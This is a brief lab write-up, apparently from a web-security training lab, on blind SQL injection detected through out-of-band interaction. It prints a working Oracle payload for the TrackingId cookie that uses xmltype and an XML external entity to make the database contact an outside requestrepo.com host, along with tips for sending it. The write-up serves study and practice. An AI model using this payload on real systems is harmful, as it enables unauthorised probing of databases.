### Lab: Blind SQL Injection with Out-of-Band (OAST) Interaction
*Because time-based and error-based provide no feedback, I ultilized Out-of-Band Application Security Testing (OAST). Bonus: Burp suite has burp collaborater client but only for pro version*

*Instead, I use https://requestrepo.com/*

## Exploitation:

**I injected an XML-based payload into the TrackingId cookie to trigger an external DNS lookup.**

**Payload:**

```
sql

' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://8vtk9q21.requestrepo.com/"> %remote;]>'),'/l') FROM dual)--
```
*xmltype: froce database to fetch from an external URI*

*http://8vtk9q21.requestrepo.com: URL I got random from web*

## Take Note:

*CTR-U to prevent special characters from breaking the HTTP request structure*

*Send Repeater, if it responses 200 OK -> success*
